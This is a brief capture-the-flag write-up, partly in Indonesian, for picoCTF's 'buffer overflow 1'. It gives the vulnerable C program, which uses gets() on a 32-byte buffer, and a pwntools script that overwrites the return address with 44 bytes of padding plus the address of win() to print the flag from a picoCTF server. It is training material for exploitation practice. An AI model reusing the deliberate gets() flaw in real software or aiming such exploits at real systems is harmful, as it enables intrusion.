# buffer overflow 1
## Problem
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

## Solusi
Ambil offset dengan cara overflow menggunakan debrujin sequence string, setelah mengetahui offsetnya tulis address dari fungsi win setelah padding sebanyak offset
```
#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln')

win_addr = elf.symbols['win']

log.info(f"Alamat win: {hex(win_addr)}")

padding = b"A" * 44
input1 = padding + p32(win_addr)

p = remote('saturn.picoctf.net', 49881)
#p = process('./vuln')

p.sendline(input1)
p.interactive()
```